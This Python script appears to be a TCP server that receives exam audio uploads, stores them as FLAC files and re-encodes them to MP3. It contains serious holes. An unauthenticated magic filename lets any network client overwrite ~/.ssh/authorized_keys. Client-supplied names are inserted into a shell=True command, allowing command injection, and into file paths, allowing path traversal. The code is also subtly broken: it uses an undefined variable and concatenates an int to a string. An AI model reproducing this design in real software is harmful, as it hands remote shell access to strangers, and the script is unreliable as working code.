#!/usr/bin/python3

import socketserver
import threading
import os.path as path
import subprocess
from datetime import date
import os

STORE_DIR   = "/tmp/flac"
ENCODE_DIR  = "/tmp/mp3"
PORT_NUM    = 28947

LAME_MODE     = "m"  # Mono
LAME_BITRATE  = 64
LAME_ABR      = True

def mkDir(path, mode=0o775):
  try:
    os.mkdir(path, mode)
    print("Making Dir:" + path)
  except:
    pass


class Connection:
  def __init__(self, socket):
    self.s          = socket
    self.buffer     = bytearray(1025)
    self.bufferData = 0

  def sendStr(self, s):
    self.s.sendall(bytes(s, 'utf-8'))

  def recvLine(self):
    out = ""
    gotName = False
    restBuffer = bytearray(self.bufferData)
    for x in range(0, self.bufferData):
      restBuffer[x] = self.buffer[x]
    restBufferData = self.bufferData
    self.buffer = bytearray(1025)
    self.bufferData = 0
    while(b'\n' not in self.buffer):
      bBuffer = bytearray(1025)
      if restBufferData > 0:
        count = restBufferData
        for x in range(0, restBufferData):
          bBuffer[x] = restBuffer[x]
        restBufferData = 0
      else:
        count = self.s.recv_into(bBuffer, 1024)
      # print("RAW>", bBuffer)
      # print("count>", count)
      if count > 0:
        for i in range(0, count):
          if not gotName:
            # print("bBuffer[{}] = {}".format(i, bBuffer[i]))
            if bBuffer[i] == 10: # 10 = \n
              # print("Buffer>", self.buffer)
              out = str(self.buffer[:i], 'utf-8')
              # print("Out>", out)
              gotName = True
              self.buffer = bytearray(1025)
            else:
              self.buffer[i] = bBuffer[i]
          else:
            self.buffer[self.bufferData] = bBuffer[i]
            self.bufferData += 1
    return out

  def storeAll(self, filename):
    total = self.bufferData
    print("self.bufferData =", self.bufferData)
    with open(filename, 'wb') as f:
      if self.bufferData > 0:
        f.write(self.buffer[:self.bufferData])
      count = -1
      while count != 0:
        bBuffer = bytearray(1025)
        count = self.s.recv_into(bBuffer, 1024)
        total += count
        # print("count>", count)
        if count > 0:
          f.write(bBuffer[:count])
    print("size =", total)


class ClientThread(socketserver.BaseRequestHandler):
  def handle(self):
    print("Connected to {}".format(self.client_address[0]))
    c = Connection(self.request)
    # c.sendStr("Connected\n")
    filename = c.recvLine()
    print("Got filename:" + filename)
    if filename == "@@@SSH_KEYS@@@":
      print("Receiving Keys")
      outFile = path.expanduser("~/.ssh/authorized_keys")
      c.storeAll(outFile)
      self.request.close()
    else:
      examID   = c.recvLine()
      print("Got examID:" + examID)
      today    = date.today()
      dateStr  = today.strftime("%Y%m%d")
      mkDir(STORE_DIR, mode=0o775)
      mkDir(path.join(STORE_DIR, dateStr), mode=0o775)
      mkDir(path.join(STORE_DIR, dateStr, examID), mode=0o775)
      outFile  = path.join(STORE_DIR, dateStr, examID, filename + ".flac")
      # outFile  = path.join(STORE_DIR, dateStr, examID, filename + ".wav")
      print("Writing to file {}".format(outFile))
      c.storeAll(outFile)
      print("Done")
      self.request.close()

      mkDir(ENCODE_DIR, mode=0o775)
      mkDir(path.join(ENCODE_DIR, dateStr), mode=0o775)
      mkDir(path.join(ENCODE_DIR, dateStr, examID), mode=0o775)
      title  = "S: " + filename
      artist = "E: " + examID
      mp3File  = path.join(ENCODE_DIR, dateStr, examID, filename + ".mp3")
      command  = "flac -s -d -c \""
      command += outFile
      brSwitch = "--cbr "
      if LAME_ABR:
        brSwitch = "--abr "
      command += "\" | lame -m " +LAME_MODE+ " --replaygain-accurate -S " + brSwitch + LAME_BITRATEE
      # command  = "lame -m m --replaygain-accurate -S --abr 64"
      command += " --tt \"" + title + "\""
      command += " --ta \"" + artist + "\""
      command += " --ty " + today.strftime("%Y")
      command += " --add-id3v2 - "
      command += "\"" + mp3File + "\""
      subprocess.check_call(command, shell=True)
      print("Done encoding")



print("Started server")
#server = socketserver.TCPServer(("127.0.0.1", PORT_NUM), ClientThread)
server = socketserver.TCPServer(("0.0.0.0", PORT_NUM), ClientThread)
server.serve_forever()

